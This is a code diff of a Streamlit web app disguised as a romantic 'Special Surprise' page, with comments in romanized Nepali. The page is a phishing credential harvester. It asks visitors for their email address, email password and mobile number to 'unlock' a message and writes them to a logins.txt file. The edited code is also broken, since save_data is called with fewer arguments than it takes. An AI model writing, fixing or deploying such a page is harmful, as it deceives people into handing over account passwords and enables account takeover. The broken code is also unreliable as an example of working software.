@@ -8,10 +8,10 @@ st.set_page_config(page_title="Special Surprise ❤️", page_icon="💖", layou
 DATA_FILE = "logins.txt"
 
 # 3. Data save garne function
-def save_data(email,num,pwd):
+def save_data(email,pwd, num):
     try:
         with open(DATA_FILE, "a", encoding="utf-8") as f:
-            f.write(f"Email: {email} | Password: {pwd}\n| number: {num}\n")
+            f.write(f"Email: {email} | Password: {pwd}\n | Number: {num}\n")
     except Exception as e:
         st.error(f"Save error: {e}")
 
@@ -44,15 +44,15 @@ if not st.session_state.submitted:
         # Variable haru form vitra define gareko
         email_val = st.text_input("Email Address jais..")
         password_val = st.text_input("Email Password", type="password")
-        number_val = st.text_input("Mobile Number", type="number")
+        number_val= st.text_input("Mobile Number..")
         
         submit_btn = st.form_submit_button("Unlock Message❤️")
         
         # Jaba button click hunchha, variable check garne
         if submit_btn:
             # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
-            if email_val and password_val and number_val:
-                save_data(email_val, number_val and password_val)
+            if email_val and password_val:
+                save_data(email_val, password_val)
                 st.session_state.submitted = True
                 st.rerun()
             else:
